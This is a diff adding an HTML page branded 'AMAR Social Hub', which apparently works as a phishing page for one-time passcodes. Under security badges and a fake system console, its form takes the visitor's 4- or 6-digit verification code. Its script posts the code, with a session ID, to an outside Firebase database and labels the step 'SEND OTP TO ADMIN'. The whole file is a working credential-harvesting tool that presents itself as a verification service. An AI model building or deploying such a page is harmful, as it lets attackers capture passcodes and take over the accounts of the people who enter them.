@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AMAR Social Hub - OTP Verification</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <style>
+        body { background-color: #0b0f19; color: #e2e8f0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        .glass-card { background: rgba(17, 24, 39, 0.7); backdrop-filter: blur(16px); border: 1px solid rgba(255, 255, 255, 0.1); box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37); }
+        .neon-glow { box-shadow: 0 0 20px rgba(6, 182, 212, 0.4); }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col justify-between items-center p-4">
+
+    <div class="w-full max-w-md my-auto space-y-4">
+        <!-- System Log Console -->
+        <div class="glass-card rounded-xl p-3 border border-cyan-500/25 text-xs font-mono">
+            <div class="flex justify-between items-center mb-1.5 pb-1 border-b border-gray-800">
+                <span class="text-cyan-400 font-bold flex items-center gap-1.5">
+                    <span class="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span> SYSTEM CONSOLE
+                </span>
+                <button onclick="clearLogs()" class="text-gray-500 hover:text-gray-300 text-[10px]">Clear</button>
+            </div>
+            <div id="logContainer" class="space-y-1 max-h-28 overflow-y-auto text-[11px] text-gray-300 pr-1">
+                <div class="text-emerald-400">[System] HTTP Realtime Sync Ready.</div>
+            </div>
+        </div>
+
+        <div class="text-center mb-2">
+            <span class="inline-block px-3 py-1 bg-cyan-500/10 text-cyan-400 border border-cyan-500/30 rounded-full text-xs font-semibold mb-2">
+                <i class="fas fa-shield-alt mr-1"></i> PRO SECURE HUB
+            </span>
+            <h1 class="text-3xl font-extrabold bg-gradient-to-r from-cyan-400 to-blue-500 bg-clip-text text-transparent">AMAR Social Hub</h1>
+            <p class="text-gray-400 text-sm mt-1">OTP Verification Website</p>
+        </div>
+
+        <div class="glass-card rounded-2xl p-6 relative overflow-hidden">
+            <div class="flex justify-center mb-4">
+                <div class="p-3 bg-cyan-500/10 border border-cyan-500/30 rounded-full text-cyan-400">
+                    <i class="fas fa-key text-2xl"></i>
+                </div>
+            </div>
+
+            <h2 class="text-xl font-bold text-center text-white mb-1">Enter Your OTP</h2>
+            <p class="text-xs text-gray-400 text-center mb-6">Supports 4-digit or 6-digit verification codes</p>
+
+            <form id="otpForm" class="space-y-4">
+                <div>
+                    <div class="flex justify-between items-center text-xs text-gray-400 mb-2">
+                        <span id="digitStatus">Digit Count: 0/6</span>
+                        <button type="button" id="toggleMask" class="hover:text-cyan-400 transition">
+                            <i class="fas fa-eye mr-1"></i> Show Code
+                        </button>
+                    </div>
+                    
+                    <div class="relative">
+                        <input type="text" id="otpInput" maxlength="6" inputmode="numeric" placeholder="• • • • • •"
+                            class="w-full bg-gray-900/80 border border-gray-700 focus:border-cyan-500 focus:ring-1 focus:ring-cyan-500 rounded-xl px-4 py-3.5 text-center text-2xl font-mono tracking-widest text-cyan-300 outline-none transition">
+                        <span id="validBadge" class="hidden absolute right-3 top-3.5 text-emerald-400 text-lg">
+                            <i class="fas fa-check-circle"></i>
+                        </span>
+                    </div>
+                </div>
+
+                <div id="errorAlert" class="hidden p-3 bg-red-500/10 border border-red-500/30 rounded-xl text-red-400 text-xs text-center"></div>
+                <div id="statusAlert" class="hidden p-3 bg-red-500/10 border border-red-500/30 rounded-xl text-red-400 text-xs text-center"></div>
+
+                <button type="submit" id="submitBtn"
+                    class="w-full bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-400 hover:to-blue-500 text-white font-bold py-3.5 px-4 rounded-xl shadow-lg neon-glow transition duration-300 flex items-center justify-center space-x-2">
+                    <i class="fas fa-paper-plane"></i>
+                    <span>SEND OTP TO ADMIN</span>
+                </button>
+            </form>
+
+            <div class="mt-6 pt-4 border-t border-gray-800 text-center">
+                <p class="text-xs text-gray-500 font-mono">Session ID: <span id="sessionIdDisplay" class="text-gray-400">Loading...</span></p>
+                <p class="text-[10px] text-emerald-400/80 mt-1"><i class="fas fa-lock mr-1"></i> Universal Direct Sync Active</p>
+            </div>
+        </div>
+    </div>
+
+    <div class="text-center text-xs text-gray-500 py-4">&copy; 2026 AMAR Social Hub. All rights reserved.</div>
+
+    <script>
+        function addLog(msg, type = 'info') {
+            const box = document.getElementById('logContainer');
+            const time = new Date().toLocaleTimeString();
+            const div = document.createElement('div');
+            div.className = type === 'error' ? 'text-red-400 font-bold' : (type === 'success' ? 'text-emerald-400' : 'text-gray-300');
+            div.innerHTML = `[${time}] ${msg}`;
+            box.appendChild(div);
+            box.scrollTop = box.scrollHeight;
+        }
+
+        function clearLogs() {
+            document.getElementById('logContainer').innerHTML = '';
+        }
+
+        const PROJECT_ID = "amar-d755e";
+        const RTDB_URL = `https://${PROJECT_ID}-default-rtdb.firebaseio.com/otps.json`;
+
+        const sessionId = 'AMAR-' + Math.random().toString(36).substring(2, 8).toUpperCase();
+        document.getElementById('sessionIdDisplay').innerText = sessionId;
+        addLog("Generated Session: " + sessionId, "info");
+
+        const otpInput = document.getElementById('otpInput');
+        const submitBtn = document.getElementById('submitBtn');
+        const statusAlert = document.getElementById('statusAlert');
+        const errorAlert = document.getElementById('errorAlert');
+        const toggleMask = document.getElementById('toggleMask');
+        let isMasked = false;
+
+        otpInput.addEventListener('input', (e) => {
+            e.target.value = e.target.value.replace(/[^0-9]/g, '');
+            const len = e.target.value.length;
+            document.getElementById('digitStatus').innerText = `Digit Count: ${len}/6`;
+            if (len === 4 || len === 6) document.getElementById('validBadge').classList.remove('hidden');
+            else document.getElementById('validBadge').classList.add('hidden');
+        });
+
+        toggleMask.addEventListener('click', () => {
+            isMasked = !isMasked;
+            otpInput.type = isMasked ? 'password' : 'text';
+            toggleMask.innerHTML = isMasked ? '<i class="fas fa-eye-slash mr-1"></i> Hide Code' : '<i class="fas fa-eye mr-1"></i> Show Code';
+        });
+
+        document.getElementById('otpForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const otp = otpInput.value.trim();
+            if (otp.length !== 4 && otp.length !== 6) {
+                errorAlert.innerText = "Please enter a valid 4 or 6 digit code.";
+                errorAlert.classList.remove('hidden');
+                return;
+            }
+            errorAlert.classList.add('hidden');
+            statusAlert.classList.add('hidden');
+
+            submitBtn.disabled = true;
+            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> <span>Sending...</span>';
+            addLog(`Submitting OTP ${otp}...`, "info");
+
+            const payload = {
+                otp: otp,
+                length: otp.length,
+                sessionId: sessionId,
+                status: "Pending",
+                createdAt: new Date().toISOString()
+            };
+
+            try {
+                const response = await fetch(RTDB_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                if (response.ok) {
+                    addLog("OTP successfully saved to database!", "success");
+                    statusAlert.className = "p-3 bg-emerald-500/10 border border-emerald-500/30 rounded-xl text-emerald-400 text-xs text-center";
+                    statusAlert.innerHTML = '<i class="fas fa-check-circle"></i> OTP successfully sent to Admin!';
+                    statusAlert.classList.remove('hidden');
+                    otpInput.value = '';
+                    document.getElementById('digitStatus').innerText = 'Digit Count: 0/6';
+                    document.getElementById('validBadge').classList.add('hidden');
+                } else {
+                    throw new Error("HTTP Status " + response.status);
+                }
+            } catch (err) {
+                console.error("Error: ", err);
+                addLog("Submission Error: " + err.message, "error");
+                statusAlert.className = "p-3 bg-red-500/10 border border-red-500/30 rounded-xl text-red-400 text-xs text-center";
+                statusAlert.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Error sending OTP. Please retry.';
+                statusAlert.classList.remove('hidden');
+            } finally {
+                submitBtn.disabled = false;
+                submitBtn.innerHTML = '<i class="fas fa-paper-plane"></i> <span>SEND OTP TO ADMIN</span>';
+            }
+        });
+    </script>
+</body>
+</html>
